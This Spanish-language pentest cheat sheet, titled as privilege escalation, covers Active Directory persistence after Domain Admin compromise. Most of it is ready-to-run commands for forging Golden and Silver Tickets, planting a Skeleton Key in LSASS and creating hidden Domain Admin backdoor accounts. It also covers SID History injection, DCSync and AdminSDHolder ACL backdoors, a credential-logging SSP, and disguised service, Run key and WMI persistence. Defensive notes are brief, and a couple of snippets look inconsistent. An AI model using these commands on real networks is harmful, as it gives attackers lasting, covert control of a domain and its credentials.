---
icon: windows
---

# Escalada de Privilegios

Una vez obtenidos privilegios de Domain Admin o equivalente, establecer mecanismos de **persistencia** que permitan mantener el acceso aunque se cambien contraseñas, se parchee el sistema o se eliminen las cuentas comprometidas.

> Estas técnicas modifican el dominio de forma significativa. En pentests reales siempre documentar los cambios y revertirlos al finalizar.

### 1. Golden Ticket

El **Golden Ticket** es un TGT forjado firmado con el hash del account **krbtgt**. Da acceso completo e ilimitado al dominio **durante la vida del ticket** (10 años por defecto). Incluso si se cambian todas las contraseñas del dominio, el Golden Ticket sigue siendo válido hasta que el hash de krbtgt sea rotado **dos veces**.

#### Obtener el hash de krbtgt

```bash
# DCSync (desde Linux)
impacket-secretsdump empresa.local/Administrator:contraseña@10.10.10.10 -just-dc-user krbtgt

# DCSync (Mimikatz en Windows)
lsadump::dcsync /user:krbtgt /domain:empresa.local

# Desde NTDS.dit volcado
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | grep krbtgt

# Necesitamos:
# - krbtgt NTLM hash: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# - Domain SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

#### Obtener el Domain SID

```powershell
# PowerShell
(Get-ADDomain).DomainSID
(Get-DomainSID)

# whoami
whoami /user    # El SID del usuario sin el último número es el Domain SID

# impacket
impacket-getPac empresa.local/usuario:contraseña -targetUser Administrator
```

#### Crear el Golden Ticket

```bash
# Impacket — genera archivo .ccache
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain empresa.local Administrator

# Usar el ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass empresa.local/Administrator@dc01.empresa.local
impacket-secretsdump -k -no-pass empresa.local/Administrator@dc01.empresa.local -just-dc
```

```powershell
# Mimikatz (Windows) — genera .kirbi e inyecta en sesión actual
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /ptt

# O exportar a archivo y luego importar
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /ticket:golden.kirbi

kerberos::ptt golden.kirbi

# Rubeus — crear Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /user:FakeAdmin /ptt

# Con grupos adicionales para máximo privilegio
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /user:FakeAdmin \
    /groups:512,513,518,519,520 /ptt
```

#### Defensa / mitigación

```
Rotar el hash de krbtgt DOS VECES con intervalo entre ambas rotaciones
(una sola rotación no invalida los Golden Tickets existentes)

Monitorizar: Event ID 4769 con Ticket Encryption Type 0x17 (RC4)
```

### 2. Silver Ticket

Ticket TGS forjado para un **servicio específico**, firmado con el hash de la **cuenta de servicio** (no krbtgt). Más sigiloso que el Golden Ticket porque no contacta con el DC para validarse.

```powershell
# Necesitamos:
# - Hash NTLM de la cuenta de servicio (ej. MACHINE$)
# - Domain SID
# - SPN del servicio objetivo

# Mimikatz — Silver Ticket para CIFS (SMB) en un equipo
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX \
    /target:target.empresa.local \
    /service:cifs \
    /rc4:MACHINE_ACCOUNT_NTLM_HASH /ptt

# Silver Ticket para HOST (comandos remotos)
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX \
    /target:target.empresa.local \
    /service:host \
    /rc4:MACHINE_ACCOUNT_NTLM_HASH /ptt

# Silver Ticket para LDAP (DCSync sin ser DA)
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX \
    /target:dc01.empresa.local \
    /service:ldap \
    /rc4:KRBTGT_HASH /ptt

# Impacket — Silver Ticket
impacket-ticketer -nthash MACHINE_NTLM_HASH -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain empresa.local -spn cifs/target.empresa.local Administrator
```

### 3. Skeleton Key

Instala un **backdoor en el proceso LSASS del DC** que permite autenticarse con cualquier cuenta usando la contraseña `mimikatz`, sin alterar las contraseñas reales. No persiste tras reinicios.

```powershell
# Mimikatz — instalar Skeleton Key en el DC
# (ejecutar desde el DC o con acceso remoto a LSASS del DC)
privilege::debug
misc::skeleton

# Ahora cualquier cuenta puede autenticarse con "mimikatz" como contraseña
net use \\dc01\admin$ /user:Administrator mimikatz
impacket-psexec empresa.local/cualquierUsuario:mimikatz@10.10.10.10

# Versión sin Mimikatz en disco — inyectar DLL en memoria
invoke-command -computername dc01 -scriptblock {
    [System.Reflection.Assembly]::LoadFile('C:\mimikatz.exe')
}
```

### 4. Backdoor en cuentas existentes

#### Añadir cuenta al grupo Domain Admins

```powershell
# Crear nueva cuenta backdoor
New-ADUser -Name "svc.backup" -AccountPassword (ConvertTo-SecureString "BackdoorPass123!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true

# Añadir a Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "svc.backup"

# Ocultar en OUs poco monitorizadas
Move-ADObject -Identity (Get-ADUser "svc.backup").DistinguishedName `
    -TargetPath "OU=ServiceAccounts,DC=empresa,DC=local"
```

#### SID History injection

Añadir el SID de Domain Admins al atributo `SIDHistory` de una cuenta sin privilegios. La cuenta aparece como sin privilegios pero AD la trata como DA.

```powershell
# Mimikatz — añadir SID a SIDHistory
privilege::debug
sid::patch
sid::add /sam:usuario_bajo_privs /new:S-1-5-21-XXX-XXX-XXX-512  # 512 = Domain Admins SID RID
```

#### Shadow Credentials (no requiere modificar contraseñas)

Si se tiene GenericWrite o WriteProperty sobre una cuenta, añadir una clave de certificado alternativa para autenticarse como esa cuenta.

```powershell
# Whisker (Windows)
.\Whisker.exe add /target:victima /domain:empresa.local /dc:dc01.empresa.local

# pyWhisker (Linux)
python3 pywhisker.py -d empresa.local -u usuario -p contraseña --target victima --action add

# Luego usar el certificado generado para obtener un TGT
.\Rubeus.exe asktgt /user:victima /certificate:BASE64_CERT /password:CERT_PASS /domain:empresa.local /dc:10.10.10.10 /ptt
```

### 5. DCSync Persistente (dar derechos a cuenta controlada)

Dar permisos de DCSync a una cuenta controlada para poder ejecutar DCSync en cualquier momento sin necesitar privilegios de DA activos.

```powershell
# Con PowerView — añadir derechos DCSync a usuario controlado
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" \
    -PrincipalIdentity "usuario_controlado" \
    -Rights DCSync -Verbose

# Luego hacer DCSync con esa cuenta cuando sea necesario
impacket-secretsdump empresa.local/usuario_controlado:contraseña@10.10.10.10 -just-dc
```

### 6. Modificar AdminSDHolder para persistencia

AdminSDHolder protege grupos privilegiados. Si se añaden permisos aquí, se propagan automáticamente a todos los grupos protegidos cada 60 minutos.

```powershell
# Dar GenericAll sobre AdminSDHolder a una cuenta controlada
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=empresa,DC=local" \
    -PrincipalIdentity "usuario_controlado" -Rights All

# Tras 60 min, el usuario_controlado tendrá GenericAll sobre:
# Domain Admins, Enterprise Admins, Schema Admins, Account Operators,
# Backup Operators, Print Operators, Server Operators, etc.
```

### 7. Malicious SSP (Security Support Provider)

Registrar una DLL como SSP en el DC para capturar credenciales en texto plano de todos los usuarios que se autentiquen.

```powershell
# Mimikatz — registrar mimilib.dll como SSP
privilege::debug
misc::memssp
# Guarda credenciales en C:\Windows\System32\kiwissp.log

# Persistente (sobrevive reinicios) — añadir al registro
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages'
$packages.SecurityPackages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $packages.SecurityPackages
# Copiar mimilib.dll a C:\Windows\System32\
```

### 8. Persistence en equipos individuales

```powershell
# Tarea programada como SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c powershell -enc BASE64PAYLOAD" /sc onlogon /ru SYSTEM

# Servicio malicioso
sc create "WindowsDefenderSvc" binPath="C:\Windows\Temp\backdoor.exe" start=auto
sc start WindowsDefenderSvc

# Registro — Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# WMI event subscription (muy sigiloso)
$Filter = Set-WMIInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name="WindowsUpdate"; EventNameSpace="root\cimv2";
    QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WMIInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
    Name="WindowsUpdate"; CommandLineTemplate="C:\Windows\Temp\backdoor.exe"
}
Set-WMIInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter=$Filter; Consumer=$Consumer
}
```

### Tabla resumen de técnicas de persistencia

| Técnica            | Requiere                      | Sobrevive a                               | Detectabilidad |
| ------------------ | ----------------------------- | ----------------------------------------- | -------------- |
| Golden Ticket      | krbtgt hash                   | Cambio de contraseñas (excepto 2x krbtgt) | Media          |
| Silver Ticket      | Hash de cuenta de servicio    | Cambio de pwd del servicio                | Baja           |
| Skeleton Key       | Acceso LSASS del DC           | ❌ No sobrevive a reinicios                | Alta           |
| Cuenta backdoor DA | DA                            | Auditorías de grupos                      | Media          |
| SID History        | DA + Mimikatz                 | Cambio de pwd de la cuenta                | Baja           |
| Shadow Credentials | GenericWrite en objeto        | Cambio de pwd                             | Baja           |
| DCSync rights      | WriteDACL sobre dominio       | —                                         | Baja           |
| AdminSDHolder      | WriteDACL sobre AdminSDHolder | —                                         | Baja           |
| WMI Subscription   | Admin local en equipo         | Reinicios                                 | Baja           |

> El Golden Ticket es la forma de persistencia más potente en AD: da acceso ilimitado y no requiere que ninguna cuenta específica exista o esté activa.

> En un red team real, combinar varias técnicas: Golden Ticket + cuenta backdoor + DCSync rights como capas de redundancia.

> Siempre documentar y revertir en pentests. El Skeleton Key, las cuentas creadas y los derechos añadidos deben eliminarse al finalizar el engagement.
